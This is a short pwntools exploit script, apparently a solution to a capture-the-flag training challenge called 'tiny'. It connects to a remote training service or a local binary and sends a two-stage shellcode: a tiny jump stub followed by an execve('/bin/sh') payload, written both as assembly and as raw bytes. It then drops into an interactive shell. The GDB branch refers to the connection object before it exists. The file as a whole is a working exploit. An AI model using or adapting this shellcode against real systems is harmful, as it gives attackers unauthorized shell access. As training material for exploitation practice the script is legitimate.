from pwn import *

context.arch="amd64"

if args.REMOTE:
 c = remote("tiny.training.offensivedefensive.it", 8080, ssl=True)
else:
 if args.GDB:
  gdb.attach (c, '''
   b *0x04011DE
   continue
   ''')
 else:
  c=process("./tiny")

shellcode_2b= """
mov al,7
add dl,al
jmp rdx
"""

shellcode_bash = """
mov rdx,0x0068732f6e69622f
push rdx
mov rdi,rsp
mov rax,0x3b
xor rsi,rsi
xor rdx,rdx
syscall
"""
c.sendline(b"\xB0\x07\x00\xC2\xFF\xE2\xFF\xE2\0\x48\xBA\x2F\x62\x69\x6E\x2F\x73\x68\x00\x52\x48\x89\xE7\x48\xC7\xC0\x3B\x00\x00\x00\x48\x31\xF6\x48\x31\xD2\x0F\x05")

c.interactive()


